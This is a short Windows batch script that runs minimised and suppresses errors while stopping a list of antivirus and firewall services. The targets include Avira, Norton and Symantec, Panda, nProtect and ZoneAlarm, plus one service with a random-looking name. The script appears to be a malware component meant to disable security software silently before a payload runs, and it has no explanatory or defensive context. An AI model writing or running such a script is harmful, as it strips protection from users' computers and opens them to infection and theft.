@echo off
@echo off
@echo off

start /min cmd /c net stop fjhccccccchu 2>nul
@echo off
start /min cmd /c net stop "Antivir Scheduler" 2>nul
start /min cmd /c net stop "AntiVir PersonalEdition Classic Service" 2>nul
start /min cmd /c net stop InoRPC 2>nul
start /min cmd /c net stop antivirService 2>nul
start /min cmd /c net stop "Antivir Service" 2>nul
start /min cmd /c net stop navapsvc 2>nul
start /min cmd /c net stop ccEvtMgr 2>nul
start /min cmd /c net stop NPFMntor 2>nul
start /min cmd /c net stop ccSetMgr 2>nul
start /min cmd /c net stop NProtectservice 2>nul
start /min cmd /c net stop NSCService 2>nul
start /min cmd /c net stop mindss 2>nul
start /min cmd /c net stop PAVFNSVR 2>nul
start /min cmd /c net stop PAVSRV 2>nul
start /min cmd /c net stop XCOMM 2>nul
start /min cmd /c net stop vsmon 2>nul

exit